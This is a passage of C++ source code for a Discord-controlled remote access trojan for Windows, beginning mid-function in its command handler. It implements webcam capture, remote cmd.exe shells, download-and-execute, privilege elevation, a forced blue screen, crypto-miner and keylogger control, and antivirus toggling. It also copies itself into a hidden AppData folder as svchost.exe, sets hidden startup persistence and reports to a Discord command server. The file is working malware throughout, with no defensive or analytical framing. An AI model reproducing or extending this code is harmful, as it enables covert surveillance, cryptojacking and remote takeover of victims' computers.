    }
    else if (command == "minerstop") {
        stop_xmrig();
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "camsnap") {
        auto future = std::async(std::launch::async, [&]() {
            cv::VideoCapture cap(0);
            if (!cap.isOpened()) return;
            cv::Mat frame;
            cap >> frame;
            if (frame.empty()) return;
            cv::imwrite("camsnap.jpg", frame);
            cap.release();
            });
        future.get();
        if (!fileExists("camsnap.jpg")) {
            send_message("Error: Failed to save camsnap.");
        }
        else {
            dpp::message msg(channel_id, "");
            msg.add_file("camsnap.jpg", dpp::utility::read_file("camsnap.jpg"), "image/jpeg");
            bot_ptr->message_create(msg, [](const dpp::confirmation_callback_t& callback) {
                if (!callback.is_error()) std::remove("camsnap.jpg");
                });
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "upload") {
        if (!event.msg.attachments.empty()) {
            dpp::attachment attachment = event.msg.attachments[0];
            std::string url = attachment.url;
            std::string filename = attachment.filename;
            std::string path = ".";
            std::istringstream iss(event.msg.content);
            std::string token;
            while (iss >> token) {
                if (token.size() > 1 && token[0] == '-') {
                    path = token.substr(1);
                }
            }
            std::string full_path = path + "\\" + filename;
            std::filesystem::create_directories(path);
            URLDownloadToFileA(NULL, url.c_str(), full_path.c_str(), 0, NULL);
            ShellExecuteA(NULL, "open", full_path.c_str(), NULL, NULL, SW_SHOWNORMAL);
            send_message("File uploaded and opened: " + full_path);
        }
        else {
            send_message("Error: No file attached.");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "update") {
        std::istringstream iss(event.msg.content);
        std::string prefix, cmd, path, filename;
        iss >> prefix >> cmd >> path >> filename;
        if (path.empty() || filename.empty()) {
            send_message("Error: Path or filename not provided. Use: !update \"path\" \"filename\"");
        }
        else if (!event.msg.attachments.empty()) {
            dpp::attachment attachment = event.msg.attachments[0];
            std::string url = attachment.url;
            std::string download_path = path + "\\" + filename;
            URLDownloadToFileA(NULL, url.c_str(), download_path.c_str(), 0, NULL);
            ShellExecuteA(NULL, "open", download_path.c_str(), NULL, NULL, SW_SHOWNORMAL);
            send_message("File updated and launched: " + download_path);
            ExitProcess(0);
        }
        else {
            send_message("Error: No file attached.");
        }
    }
    else if (command == "admin") {
        if (IsAdmin()) {
            send_message("Already running as administrator.");
        }
        else {
            send_message("Requesting administrator privileges...");
            char pathC[MAX_PATH];
            GetModuleFileNameA(NULL, pathC, MAX_PATH);
            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = pathC;
            sei.nShow = SW_SHOW;
            if (ShellExecuteExA(&sei)) {
                send_message("Administrator rights granted. Re-launching as administrator.");
                ExitProcess(0);
            }
            else {
                send_message("Administrator rights were not granted.");
            }
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "shell") {
        size_t pos = event.msg.content.find("shell");
        if (pos != std::string::npos) {
            pos += 5;
            while (pos < event.msg.content.size() && isspace(static_cast<unsigned char>(event.msg.content[pos]))) pos++;
            std::string shell_cmd = event.msg.content.substr(pos);
            if (!shell_cmd.empty()) {
                FILE* pipe = _popen(("cmd.exe /c " + shell_cmd).c_str(), "r");
                if (pipe) {
                    char buffer[128];
                    std::string result = "Shell output:\n";
                    while (fgets(buffer, sizeof(buffer), pipe)) {
                        result += buffer;
                    }
                    _pclose(pipe);
                    send_message(result);
                }
            }
            else {
                send_message("Error: No shell command provided.");
            }
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "!shell") {
        size_t pos = event.msg.content.find("!shell");
        if (pos != std::string::npos) {
            pos += 6;
            while (pos < event.msg.content.size() && isspace(static_cast<unsigned char>(event.msg.content[pos]))) pos++;
            std::string shell_cmd = event.msg.content.substr(pos);
            if (!shell_cmd.empty()) {
                FILE* pipe = _popen(("cmd.exe /c " + shell_cmd).c_str(), "r");
                if (pipe) {
                    char buffer[128];
                    std::string result = "Shell output:\n";
                    while (fgets(buffer, sizeof(buffer), pipe)) {
                        result += buffer;
                    }
                    _pclose(pipe);
                    send_message(result);
                }
            }
            else {
                send_message("Error: No shell command provided.");
            }
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "!!shell") {
        if (!shell_session_active) {
            shell_session_active = true;
            send_message("Shell session started. Use '!!shell stop' to end.");
            std::thread([event]() {
                while (shell_session_active) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    if (event.msg.content.find("!!shell stop") != std::string::npos) {
                        shell_session_active = false;
                        send_long_message(bot_ptr, channel_id, "Shell session stopped.");
                        break;
                    }
                    size_t pos = event.msg.content.find("!!shell");
                    if (pos != std::string::npos) {
                        pos += 7;
                        while (pos < event.msg.content.size() && isspace(static_cast<unsigned char>(event.msg.content[pos]))) pos++;
                        std::string shell_cmd = event.msg.content.substr(pos);
                        if (!shell_cmd.empty() && shell_cmd != "stop") {
                            FILE* pipe = _popen(("cmd.exe /c " + shell_cmd).c_str(), "r");
                            if (pipe) {
                                char buffer[128];
                                std::string result = "Shell output:\n";
                                while (fgets(buffer, sizeof(buffer), pipe)) {
                                    result += buffer;
                                }
                                _pclose(pipe);
                                send_long_message(bot_ptr, channel_id, result);
                            }
                        }
                    }
                }
                }).detach();
        }
        else {
            send_message("Shell session already active.");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "shelladmin") {
        if (!IsAdmin()) {
            send_message("Error: Not running as administrator.");
        }
        else {
            size_t pos = event.msg.content.find("shelladmin");
            if (pos != std::string::npos) {
                pos += 10;
                while (pos < event.msg.content.size() && isspace(static_cast<unsigned char>(event.msg.content[pos]))) pos++;
                std::string shell_cmd = event.msg.content.substr(pos);
                if (!shell_cmd.empty()) {
                    FILE* pipe = _popen(("cmd.exe /c " + shell_cmd).c_str(), "r");
                    if (pipe) {
                        char buffer[128];
                        std::string result = "Shell admin output:\n";
                        while (fgets(buffer, sizeof(buffer), pipe)) {
                            result += buffer;
                        }
                        _pclose(pipe);
                        send_message(result);
                    }
                }
            }
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "gps") {
        std::string geo = getCountry();
        send_message("Country: " + geo);
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "kill") {
        send_message("Self-destructing...");
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        DeleteFileA(path);
        exit(0);
    }
    else if (command == "bsod") {
        // Attempt BSOD without requiring explicit administrator check
        HANDLE hToken;
        TOKEN_PRIVILEGES tp;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
            CloseHandle(hToken);
        }
        typedef ULONG(NTAPI* pNtRaiseHardError)(ULONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
        if (NtRaiseHardError) {
            ULONG response;
            NtRaiseHardError(0xC0000420, 0, 0, NULL, 6, &response);
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "stopkey") {
        if (keylog_active) {
            keylog_active = false;
            send_message("Keylogger stopped.");
        }
        else {
            send_message("Keylogger is not running.");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "shutdown") {
        system("shutdown /s /t 0");
        send_message("Shutting down...");
    }
    else if (command == "reboot") {
        // Attempt reboot without requiring explicit administrator rights
        HANDLE hToken;
        TOKEN_PRIVILEGES tp;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
            CloseHandle(hToken);
        }
        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_INSTALLATION);
        send_message("Rebooting...");
    }
    else if (command == "lockscreen") {
        LockWorkStation();
        send_message("Screen locked.");
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "process") {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(pe);
            if (Process32First(hSnapshot, &pe)) {
                std::string process_list = "Running processes:\n";
                do {
                    char buffer[260];
                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, buffer, sizeof(buffer), NULL, NULL);
                    process_list += std::string(buffer) + "\n";
                } while (Process32Next(hSnapshot, &pe));
                send_message(process_list);
            }
            CloseHandle(hSnapshot);
        }
        else {
            send_message("Error: Could not get process list.");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "whererat") {
        char pathbuf[MAX_PATH];
        GetModuleFileNameA(NULL, pathbuf, MAX_PATH);
        send_long_message(bot_ptr, channel_id, "Bot location: " + std::string(pathbuf));
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "scremer") {
        std::string duration_str, volume_str;
        std::vector<std::string> extra_flags = flags;
        for (auto it = extra_flags.begin(); it != extra_flags.end();) {
            const std::string& flag = *it;
            if (flag.size() > 2 && (flag.rfind("-v", 0) == 0) && flag.back() == '%') {
                volume_str = flag;
                it = extra_flags.erase(it);
            }
            else if (duration_str.empty() && flag.size() > 1 && (std::isdigit(flag[1]) || (flag[1] == '-' && flag.size() > 2 && std::isdigit(flag[2])))) {
                duration_str = flag;
                it = extra_flags.erase(it);
            }
            else {
                ++it;
            }
        }
        if (duration_str.empty() || volume_str.empty()) {
            send_message("Error: Please specify duration and volume, e.g., !scremer -5 -v100%");
            return;
        }
        int duration;
        try {
            duration = std::stoi(duration_str.substr(1));
            if (duration <= 0) throw std::invalid_argument("<=0");
        }
        catch (...) {
            send_message("Error: Invalid duration.");
            return;
        }
        float volume;
        try {
            std::string vol_num = volume_str.substr(2, volume_str.size() - 3);
            volume = std::stof(vol_num) / 100.0f;
        }
        catch (...) {
            send_message("Error: Invalid volume.");
            return;
        }
        if (volume < 0.0f || volume > 1.0f) {
            send_message("Error: Volume must be 0–100%.");
            return;
        }
        if (!event.msg.attachments.empty()) {
            dpp::attachment attachment = event.msg.attachments[0];
            std::string url = attachment.url;
            std::string filename = attachment.filename;
            URLDownloadToFileA(NULL, url.c_str(), filename.c_str(), 0, NULL);
            send_message("Starting scremer...");
            std::thread([filename, duration, volume, event, extra_flags]() {
                scremer(filename, duration, volume, event, extra_flags);
                send_long_message(bot_ptr, channel_id, "Scremer completed.");
                }).detach();
        }
        else {
            send_message("Error: No file attached.");
        }
    }
    else if (command == "changewall") {
        if (!event.msg.attachments.empty()) {
            dpp::attachment attachment = event.msg.attachments[0];
            std::string url = attachment.url;
            std::string filename = attachment.filename;
            URLDownloadToFileA(NULL, url.c_str(), filename.c_str(), 0, NULL);
            cv::Mat img = cv::imread(filename);
            if (img.empty()) {
                send_message("Error: Failed to load image for wallpaper.");
                return;
            }
            std::string bmpName = "wallpaper_for_spi.bmp";
            if (!cv::imwrite(bmpName, img)) {
                send_message("Error: Failed to convert image to BMP.");
                return;
            }
            std::filesystem::path absPath = std::filesystem::absolute(bmpName);
            std::wstring full_path = absPath.wstring();
            if (!SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)full_path.c_str(),
                SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
                send_message("Error: Failed to set wallpaper.");
                return;
            }
            send_message("Wallpaper changed successfully.");
        }
        else {
            send_message("Error: No file attached.");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "volume") {
        std::istringstream iss(event.msg.content);
        std::string prefix, cmd, arg;
        iss >> prefix >> cmd >> arg;
        if (!arg.empty() && arg.back() == '%') {
            float volume_val = 0.0f;
            try {
                volume_val = std::stof(arg.substr(0, arg.size() - 1)) / 100.0f;
            }
            catch (...) {
                send_message("Invalid volume argument");
                return;
            }
            setVolume(volume_val);
            send_message("Volume set to " + arg);
        }
        else {
            send_message("Invalid volume argument");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "antivirus") {
        std::istringstream iss(event.msg.content);
        std::string prefix, cmd, arg;
        iss >> prefix >> cmd >> arg;
        if (arg == "-off") {
            manageAntivirus(false);
        }
        else if (arg == "-on") {
            manageAntivirus(true);
        }
        else {
            send_message("Invalid antivirus argument");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "clone") {
        std::istringstream iss(event.msg.content);
        std::string prefix, cmd, new_name_flag;
        iss >> prefix >> cmd >> new_name_flag;
        if (new_name_flag.empty() || new_name_flag[0] != '-') {
            send_message("Error: No new name provided. Use: !clone -newname.exe");
        }
        else {
            std::string new_name = new_name_flag.substr(1);
            if (new_name.empty()) {
                send_message("Error: Invalid new name.");
            }
            else {
                char current_path[MAX_PATH];
                GetModuleFileNameA(NULL, current_path, MAX_PATH);
                std::string new_path = new_name;
                if (CopyFileA(current_path, new_path.c_str(), FALSE)) {
                    if (IsAdmin()) {
                        SHELLEXECUTEINFOA sei = { sizeof(sei) };
                        sei.lpVerb = "runas";
                        sei.lpFile = new_path.c_str();
                        sei.nShow = SW_SHOW;
                        ShellExecuteExA(&sei);
                    }
                    else {
                        ShellExecuteA(NULL, "open", new_path.c_str(), NULL, NULL, SW_SHOWNORMAL);
                    }
                    send_message("Clone created and started: " + new_path + "\nType 'yes' to close original, 'no' to keep it running.");
                    awaiting_close = true;
                    awaiting_user = event.msg.author.id;
                }
                else {
                    send_message("Error: Failed to copy file.");
                }
            }
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "endtask") {
        std::istringstream iss(event.msg.content);
        std::string prefix, cmd, process_name;
        iss >> prefix >> cmd >> process_name;
        if (process_name.empty() || process_name[0] != '-') {
            send_message("Error: No process name provided.");
        }
        else {
            process_name = process_name.substr(1);
            std::string sys_cmd = "taskkill /im " + process_name + " /f >nul 2>&1";
            int result = system(sys_cmd.c_str());
            if (result == 0) {
                send_message("Process " + process_name + " terminated.");
            }
            else {
                send_message("Error: Failed to terminate process " + process_name);
            }
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "?Admin") {
        send_message("Admin: " + std::string(IsAdmin() ? "Yes" : "No"));
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "?webcam") {
        send_message("Webcam: " + std::string(hasWebcam() ? "Yes" : "No"));
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "mes") {
        size_t pos = event.msg.content.find("mes");
        if (pos != std::string::npos) {
            pos += 3;
            while (pos < event.msg.content.size() && isspace(static_cast<unsigned char>(event.msg.content[pos]))) pos++;
            std::string user_message = event.msg.content.substr(pos);
            if (user_message.empty()) {
                send_message("Error: No message provided. Use: !mes <your message>");
                return;
            }
            MesDialogParams* params = new MesDialogParams();
            params->messageText = user_message;
            params->authorId = event.msg.author.id;
            params->bot = bot_ptr;
            params->channelId = channel_id;
            std::thread([params]() {
                ShowMesDialog(params);
                delete params;
                }).detach();
        }
    }
    else {
        if (!command.empty()) {
            send_message("Unknown command: " + command);
            if (has_flags) {
                std::thread([flags, event]() {
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    execute_flags(flags, event);
                    }).detach();
            }
        }
    }
}

std::pair<std::string, std::vector<std::string>> parse_command(const std::string& content) {
    std::string trimmed = content;
    size_t start = trimmed.find_first_not_of(" \t");
    if (start != std::string::npos) {
        trimmed = trimmed.substr(start);
    }
    else {
        trimmed.clear();
    }
    if (trimmed.empty() || trimmed[0] != '!') {
        return { "", {} };
    }
    size_t end = trimmed.find_first_of(" \t", 1);
    std::string command;
    if (end != std::string::npos) {
        command = trimmed.substr(1, end - 1);
        trimmed = trimmed.substr(end);
    }
    else {
        command = trimmed.substr(1);
        trimmed.clear();
    }
    std::istringstream iss(trimmed);
    std::vector<std::string> flags;
    std::string token;
    while (iss >> token) {
        if (!token.empty() && token[0] == '-') flags.push_back(token);
    }
    return { command, flags };
}

// === Исправленная функция EnsureAutostartShortcut (её незамедлительное поведение) ===
void EnsureAutostartShortcut() {
    std::string appdata = GetAppDataPath();
    if (appdata.empty()) return;

    // Папка, куда скопирована вся программа (WinMain гарантирует её создание)
    std::filesystem::path hidden_dir = appdata + "\\.hidden";
    std::filesystem::create_directory(hidden_dir);

    // Путь до скопированного svchost.exe (внутри .hidden\svchost.exe)
    std::filesystem::path hidden_exe = hidden_dir / "svchost.exe";

    // Получаем текущий исполняемый путь (чтобы отличить оригинал от копии)
    char exePathC[MAX_PATH];
    GetModuleFileNameA(NULL, exePathC, MAX_PATH);
    std::filesystem::path exePath(exePathC);

    // Если мы **не** запущены как .hidden\svchost.exe, то в WinMain другая ветка (копирование и ShellExecute) сработает раньше,
    // и до этого момента EnsureAutostartShortcut никогда не вызывается для оригинала. А вот когда запустится копия svchost.exe,
    // exePath == hidden_exe, и мы попадаем сюда, чтобы создать ярлык.

    // Определяем папку автозагрузки текущего пользователя
    PWSTR startupPathW;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &startupPathW))) {
        std::filesystem::path startupPath(startupPathW);
        CoTaskMemFree(startupPathW);

        // Имя файла-ярлыка в автозагрузке
        std::filesystem::path linkPath = startupPath / "svhost.lnk";

        // Если уже есть такой ярлык, не создаём заново
        if (std::filesystem::exists(linkPath)) return;

        CoInitialize(NULL);

        IShellLinkW* pShellLink = nullptr;
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink))) {
            // Указываем, что цель ярлыка — именно скопированный svchost.exe
            std::wstring hidden_exe_w = hidden_exe.wstring();
            pShellLink->SetPath(hidden_exe_w.c_str());

            // Рабочая директория для ярлыка — папка, где лежит hidden_exe
            std::wstring workingDir = hidden_exe.parent_path().wstring();
            pShellLink->SetWorkingDirectory(workingDir.c_str());

            pShellLink->SetDescription(L"svhost auto-start");

            IPersistFile* pPersistFile = nullptr;
            if (SUCCEEDED(pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile))) {
                // Сохраняем .lnk в %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
                pPersistFile->Save(linkPath.wstring().c_str(), TRUE);
                pPersistFile->Release();
            }
            pShellLink->Release();
        }
        CoUninitialize();

        // Делаем .lnk скрытым
        SetFileAttributesW(linkPath.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}
// === Конец EnsureAutostartShortcut ===

size_t countryWriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string getCountry() {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://ipapi.co/country_name/");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, countryWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return readBuffer.empty() ? "Unknown" : readBuffer;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) {
        ShowWindow(consoleWnd, SW_HIDE);
    }

    // 1) Определяем, откуда запущен файл (полный путь и папка)
    char exePathC[MAX_PATH];
    GetModuleFileNameA(NULL, exePathC, MAX_PATH);
    std::filesystem::path exePath(exePathC);
    std::filesystem::path parentDir = exePath.parent_path();

    // 2) Собираем (опционально) байты какой-нибудь картинки из этой же папки (OpenCV-логика) — оставляем без изменений.
    std::vector<unsigned char> program_bytes;
    bool imageFound = false;
    for (auto& entry : std::filesystem::directory_iterator(parentDir)) {
        if (entry.is_regular_file()) {
            auto ext = entry.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (ext == ".png" || ext == ".jpg" || ext == ".bmp") {
                std::ifstream imgFile(entry.path(), std::ios::binary);
                if (imgFile) {
                    program_bytes = std::vector<unsigned char>((std::istreambuf_iterator<char>(imgFile)),
                        std::istreambuf_iterator<char>());
                    imgFile.close();
                    imageFound = true;
                    break;
                }
            }
        }
    }
    // Если изображения нет, просто продолжаем без него.

    // 3) Узнаём %AppData%
    std::string appdata = GetAppDataPath();
    if (appdata.empty()) return 1;

    // Путь к скрытой папке, куда будем копировать всю содержимое папки parentDir
    std::filesystem::path hidden_dir = appdata + "\\.hidden";

    // 4) Если мы **не** запущены из уже скопированного svchost.exe (то есть parentDir != %AppData%\.hidden или имя файла != "svchost.exe"),
    //    то мы в оригинале (setup.exe в папке mod). Значит, нужно скопировать всю папку parentDir в hidden_dir, при этом в копии переименовать setup.exe → svchost.exe,
    //    после чего запустить копию и сразу же выйти из оригинала.

    if (!(parentDir == hidden_dir && exePath.filename() == "svchost.exe")) {
        // Формируем полный путь к hidden_dir\svchost.exe
        std::filesystem::path newExe = hidden_dir / "svchost.exe";

        // Если раньше ещё не создавали hidden_dir или не копировали туда файлы
        if (!std::filesystem::exists(newExe)) {
            std::filesystem::create_directories(hidden_dir);

            for (auto& entry : std::filesystem::recursive_directory_iterator(parentDir)) {
                std::filesystem::path rel = std::filesystem::relative(entry.path(), parentDir);
                std::filesystem::path tgt = hidden_dir / rel;

                if (entry.is_directory()) {
                    std::filesystem::create_directories(tgt);
                }
                else if (entry.is_regular_file()) {
                    // Если это тот самый setup.exe, который мы сейчас запускаем, то копируем его как hidden_dir\svchost.exe
                    if (entry.path() == exePath) {
                        CopyFileA(entry.path().string().c_str(), newExe.string().c_str(), FALSE);
                    }
                    else {
                        // Всё остальное просто точно так же копируем в соответствующую подпапку
                        std::filesystem::copy_file(entry.path(), tgt, std::filesystem::copy_options::overwrite_existing);
                    }
                }
            }
        }
        // Запускаем скопированный и переименованный svchost.exe и сразу завершаем этот оригинал
        ShellExecuteA(NULL, "open", newExe.string().c_str(), NULL, NULL, SW_SHOWNORMAL);
        return 0;
    }

    // 5) Мы уже запущены как скопированный %AppData%\.hidden\svchost.exe. Именно здесь мы добавляем его в автозагрузку.
    EnsureAutostartShortcut();

    // 6) Создаём папку для данных бота, читаем/пишем туда id-канал и далее запускаем всю логику DPP-бота, OpenCV, Web, ключлоггера и т.д.
    std::filesystem::path bot_data_dir = std::filesystem::path(appdata) / ".bot_data";
    std::filesystem::create_directory(bot_data_dir);

    std::string id_file = (bot_data_dir / "saved_channel_id.txt").string();
    std::string token = "BOT TOKEN";
    dpp::cluster bot(token, dpp::i_default_intents | dpp::i_guilds | dpp::i_guild_messages | dpp::i_message_content);
    bot_ptr = &bot;

    std::string server_id = "1377261391064465428";
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    std::string base_channel_name = (GetComputerNameA(computer_name, &size)) ? std::string(computer_name) : "unknown";

    std::string channel_name = base_channel_name;
    std::transform(channel_name.begin(), channel_name.end(), channel_name.begin(), ::tolower);
    for (auto& c : channel_name) {
        if (isspace(static_cast<unsigned char>(c))) {
            c = '-';
        }
    }

    bot.on_log(dpp::utility::cout_logger());
    std::atomic<bool> connected(false);

    bot.on_ready([&bot, server_id, channel_name, id_file, &connected](const dpp::ready_t& event) {
        connected = true;
        std::this_thread::sleep_for(std::chrono::seconds(1));

        dpp::snowflake guild_id = std::stoull(server_id);
        dpp::guild* guild = dpp::find_guild(guild_id);
        if (!guild) return;

        if (std::filesystem::exists(id_file)) {
            std::ifstream ifs(id_file);
            uint64_t saved_id = 0;
            if (ifs >> saved_id) {
                dpp::channel* saved_ch = dpp::find_channel(saved_id);
                if (saved_ch && saved_ch->guild_id == guild_id) {
                    channel_id = saved_id;
                    send_long_message(&bot, channel_id, "Bot restarted, reusing existing channel.");
                    return;
                }
            }
        }

        bool channel_exists = false;
        for (auto& ch_id : guild->channels) {
            dpp::channel* ch = dpp::find_channel(ch_id);
            if (ch && ch->name == channel_name) {
                channel_id = ch->id;
                channel_exists = true;
                break;
            }
        }

        if (!channel_exists) {
            dpp::channel new_channel;
            new_channel.set_guild_id(guild_id);
            new_channel.set_name(channel_name);
            new_channel.set_type(dpp::CHANNEL_TEXT);

            bot.channel_create(
                new_channel,
                [id_file](const dpp::confirmation_callback_t& c) {
                    if (!c.is_error()) {
                        dpp::channel created = c.get<dpp::channel>();
                        channel_id = created.id;
                        std::ofstream ofs(id_file);
                        ofs << channel_id;
                        send_long_message(bot_ptr, channel_id, "Channel created for this machine.");
                    }
                    else {
                        send_long_message(bot_ptr, channel_id, "Error: Could not create channel. " + c.get_error().message);
                    }
                }
            );
        }
        else {
            std::ofstream ofs(id_file);
            ofs << channel_id;
            send_long_message(&bot, channel_id, "Bot connected to existing channel.");
        }
        });

    bot.on_message_create([&bot](const dpp::message_create_t& event) {
        if (event.msg.author.is_bot()) return;
        if (event.msg.channel_id != channel_id) return;

        auto [command, flags] = parse_command(event.msg.content);
        executeCommand(command, flags, event);
        });

    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    bot.start(dpp::st_wait);
    return 0;
}
